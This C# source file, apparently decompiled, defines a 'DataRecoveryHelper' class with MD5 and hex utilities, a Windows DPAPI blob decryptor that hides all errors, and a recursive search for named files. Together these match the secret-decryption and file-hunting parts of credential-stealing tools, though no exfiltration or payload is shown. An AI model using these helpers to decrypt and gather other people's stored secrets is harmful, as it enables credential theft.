using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace NoiseMe.Drags.App.Models
{
	public static class DataRecoveryHelper
	{
		public static string GetMd5Hash(string source)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(source);
			return GetHexString(mD5CryptoServiceProvider.ComputeHash(bytes));
		}

		private static string GetHexString(IList<byte> bt)
		{
			string text = string.Empty;
			for (int i = 0; i < bt.Count; i++)
			{
				byte num = bt[i];
				int num2 = num & 0xF;
				int num3 = (num >> 4) & 0xF;
				text = ((num3 <= 9) ? (text + num3.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num3 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
				text = ((num2 <= 9) ? (text + num2.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
				if (i + 1 != bt.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
		}

		public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					return string.Empty;
				}
				byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
				return Encoding.UTF8.GetString(bytes);
			}
			catch (CryptographicException)
			{
				return string.Empty;
			}
			catch (Exception)
			{
				return string.Empty;
			}
		}

		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files == null || files.Length == 0 || level > maxLevel)
			{
				return list;
			}
			string[] directories = Directory.GetDirectories(baseDirectory);
			foreach (string path in directories)
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					FileInfo[] files2 = directoryInfo.GetFiles();
					bool flag = false;
					for (int j = 0; j < files2.Length; j++)
					{
						if (flag)
						{
							break;
						}
						for (int k = 0; k < files.Length; k++)
						{
							if (flag)
							{
								break;
							}
							string a = files[k];
							FileInfo fileInfo = files2[j];
							if (a == fileInfo.Name)
							{
								flag = true;
								list.Add(fileInfo.FullName);
							}
						}
					}
					foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
					{
						if (!list.Contains(item))
						{
							list.Add(item);
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
	}
}
